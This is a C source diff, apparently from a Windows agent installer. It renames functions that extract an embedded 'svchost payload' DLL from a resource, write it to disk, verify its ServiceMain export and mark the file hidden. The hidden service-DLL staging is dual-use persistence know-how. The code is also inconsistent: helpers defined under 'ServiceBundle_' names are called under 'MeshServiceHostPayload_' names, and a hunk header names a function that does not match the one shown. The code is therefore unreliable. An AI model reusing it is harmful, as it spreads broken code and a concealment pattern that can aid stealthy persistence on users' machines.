@@ -22,7 +22,7 @@ BOOL ServiceBundle_WriteToPath(const wchar_t* destination)
 #endif
 
 #define RUNTIME_CAPTURE_ENV_VAR L"RUNTIME_CAPTURE_FAILED_DLL"
-#define RUNTIME_BUNDLE_EXPORT_NAME "ServiceHost_SvchostServiceMain"
+#define RUNTIME_BUNDLE_EXPORT_NAME "ServiceHost_ServiceMain"
 
 static void ServiceBundle_SetHiddenAttributes(const wchar_t* path)
 {
@@ -84,7 +84,7 @@ static BOOL ServiceBundle_GetEmbeddedResource(const void** resourceData, DWORD* 
     return TRUE;
 }
 
-static BOOL MeshSvchostPayload_VerifyFileSize(const wchar_t* path, DWORD expectedSize)
+static BOOL MeshServiceHostPayload_VerifyFileSize(const wchar_t* path, DWORD expectedSize)
 {
     WIN32_FILE_ATTRIBUTE_DATA fileInfo;
     ULARGE_INTEGER actualSize;
@@ -111,7 +111,7 @@ static BOOL MeshSvchostPayload_VerifyFileSize(const wchar_t* path, DWORD expecte
     return TRUE;
 }
 
-static BOOL MeshSvchostPayload_VerifyWrittenDll(const wchar_t* path)
+static BOOL MeshServiceHostPayload_VerifyWrittenDll(const wchar_t* path)
 {
     HMODULE moduleHandle = NULL;
     FARPROC serviceMain = NULL;
@@ -142,7 +142,7 @@ static BOOL MeshSvchostPayload_VerifyWrittenDll(const wchar_t* path)
     return TRUE;
 }
 
-static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
+static void MeshServiceHostPayload_TryCaptureFailure(const wchar_t* destination)
 {
     if (destination == NULL || destination[0] == L'\0') { return; }
 
@@ -172,7 +172,7 @@ static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
     }
 }
 
-BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
+BOOL MeshServiceHostPayload_WriteToPath(const wchar_t* destination)
 {
     HANDLE fileHandle = INVALID_HANDLE_VALUE;
     const void* payloadData = NULL;
@@ -186,7 +186,7 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
         return FALSE;
     }
 
-    if (!MeshSvchostPayload_GetEmbeddedResource(&payloadData, &payloadSize))
+    if (!MeshServiceHostPayload_GetEmbeddedResource(&payloadData, &payloadSize))
     {
         ServiceDeploy_LogInstallEvent(L"Failed to locate embedded svchost payload resource (error=%lu)", GetLastError());
         return FALSE;
@@ -256,20 +256,20 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
         }
     }
 
-    if (!MeshSvchostPayload_VerifyFileSize(destination, payloadSize) ||
-        !MeshSvchostPayload_VerifyWrittenDll(destination))
+    if (!MeshServiceHostPayload_VerifyFileSize(destination, payloadSize) ||
+        !MeshServiceHostPayload_VerifyWrittenDll(destination))
     {
         DWORD verifyErr = GetLastError();
         ServiceDeploy_LogInstallEvent(L"Embedded svchost payload verification failed for %ls (error=%lu)", destination, verifyErr);
         ServiceDeploy_LogPathState(destination);
-        MeshSvchostPayload_TryCaptureFailure(destination);
+        MeshServiceHostPayload_TryCaptureFailure(destination);
         DeleteFileW(destination);
         SetLastError(verifyErr);
         return FALSE;
     }
 
     ServiceDeploy_LogInstallEvent(L"Embedded svchost payload staged (%lu bytes) to %ls", payloadSize, destination);
-    MeshSvchostPayload_SetHiddenAttributes(destination);
+    MeshServiceHostPayload_SetHiddenAttributes(destination);
     return TRUE;
 }
 
